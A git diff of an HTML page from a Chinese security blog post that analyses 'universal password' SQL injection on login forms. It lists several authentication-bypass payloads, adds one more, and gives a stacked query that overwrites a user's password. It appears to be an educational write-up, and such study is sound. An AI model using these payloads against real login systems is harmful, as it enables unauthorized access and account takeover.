@@ -96,7 +96,7 @@
 <meta property="og:url" content="http://yoursite.com/2017/05/10/万能口令漏洞分析/index.html">
 <meta property="og:site_name" content="Note&#39;s blog">
 <meta property="og:description" content="后台登陆界面程序在验证帐号密码的时候，可能的sql语句如下：12345a.select * from user where username=&apos;$username&apos; and password=&apos;$password&apos;;b.select username,password from user where username=&apos;$username&apos;;   if(count() == 1)//如果查询到一行">
-<meta property="og:updated_time" content="2017-05-20T02:45:49.028Z">
+<meta property="og:updated_time" content="2017-08-13T02:23:25.314Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="万能口令漏洞分析">
 <meta name="twitter:description" content="后台登陆界面程序在验证帐号密码的时候，可能的sql语句如下：12345a.select * from user where username=&apos;$username&apos; and password=&apos;$password&apos;;b.select username,password from user where username=&apos;$username&apos;;   if(count() == 1)//如果查询到一行">
@@ -411,7 +411,7 @@
       
         <p>后台登陆界面程序在验证帐号密码的时候，可能的sql语句如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">a.select * from user <span class="built_in">where</span> username=<span class="string">'$username'</span> and password=<span class="string">'$password'</span>;</div><div class="line">b.select username,password from user <span class="built_in">where</span> username=<span class="string">'$username'</span>;</div><div class="line">   <span class="keyword">if</span>(count() == 1)//如果查询到一行数据</div><div class="line">      <span class="keyword">if</span>(password == <span class="variable">$password</span>)</div><div class="line">        登陆成功;</div></pre></td></tr></table></figure></p>
 <a id="more"></a>
-<p>如果为语句a，可以尝试使用如下几种用户名登陆，而不需要输入正确的密码，输入任意字符的密码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">x<span class="string">' or 1=1 #'</span>       select * from user <span class="built_in">where</span> username=<span class="string">'x'</span> or 1=1 <span class="comment">#'' and password='$password';</span></div><div class="line">x<span class="string">' or 1=1 /*       select * from user where username='</span>x<span class="string">' or 1=1 /*'</span> and password=<span class="string">'$password'</span>;</div><div class="line">x<span class="string">' or 1=1 --       select * from user where username='</span>x<span class="string">' or 1=1 --'</span> and password=<span class="string">'$password'</span>;</div><div class="line">x<span class="string">' or '</span>1<span class="string">'='</span>1       select * from user <span class="built_in">where</span> username=<span class="string">'x'</span> or <span class="string">'1'</span>=<span class="string">'1'</span> and password=<span class="string">'$password'</span>;</div><div class="line">x<span class="string">' or userid=1 #'</span>  select * from user <span class="built_in">where</span> username=<span class="string">'x'</span> or userid=1 <span class="comment">#'' and password='$password';</span></div><div class="line">admin<span class="string">' or 1=1 --(空格)</span></div></pre></td></tr></table></figure></p>
+<p>如果为语句a，可以尝试使用如下几种用户名登陆，而不需要输入正确的密码，输入任意字符的密码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">x<span class="string">' or 1=1 #'</span>       select * from user <span class="built_in">where</span> username=<span class="string">'x'</span> or 1=1 <span class="comment">#'' and password='$password';</span></div><div class="line">x<span class="string">' or 1=1 /*       select * from user where username='</span>x<span class="string">' or 1=1 /*'</span> and password=<span class="string">'$password'</span>;</div><div class="line">x<span class="string">' or 1=1 --       select * from user where username='</span>x<span class="string">' or 1=1 --'</span> and password=<span class="string">'$password'</span>;</div><div class="line">x<span class="string">' or '</span>1<span class="string">'='</span>1       select * from user <span class="built_in">where</span> username=<span class="string">'x'</span> or <span class="string">'1'</span>=<span class="string">'1'</span> and password=<span class="string">'$password'</span>;</div><div class="line">x<span class="string">' or userid=1 #'</span>  select * from user <span class="built_in">where</span> username=<span class="string">'x'</span> or userid=1 <span class="comment">#'' and password='$password';</span></div><div class="line">admin<span class="string">' or 1=1 --(空格) </span></div><div class="line">x' or 1=1 or <span class="string">'1'</span>=<span class="string">'1		这种情况是考虑了逻辑运算符and和or的优先级问题。</span></div></pre></td></tr></table></figure></p>
 <p>userid需要猜对，可以使用id、uid等替换；</p>
 <p>如果为语句b，可以先使用上面的方法，通过观察返回的提示，判断是否存在注入（提示密码输入错误，而不是用户名输入错误），然后可以尝试修改账户的密码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">x<span class="string">';update user set password='</span>123456<span class="string">' where userid=1 #'</span></div></pre></td></tr></table></figure></p>
 <p>带入到语句b中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select username,password from user <span class="built_in">where</span> username=<span class="string">'x'</span>;update user <span class="built_in">set</span> password=<span class="string">'123456'</span> <span class="built_in">where</span> userid=1 <span class="comment">#'';</span></div></pre></td></tr></table></figure></p>
@@ -661,6 +661,18 @@
               
                 <li class="links-of-blogroll-item">
                   <a href="http://hacktech.cn/" title="Akkuman" target="_blank">Akkuman</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://fatofyoung.github.io/" title="fatofyoung" target="_blank">fatofyoung</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.waitalone.cn/" title="waitalone" target="_blank">waitalone</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.cnseay.com/" title="seay" target="_blank">seay</a>
                 </li>
               
             </ul>
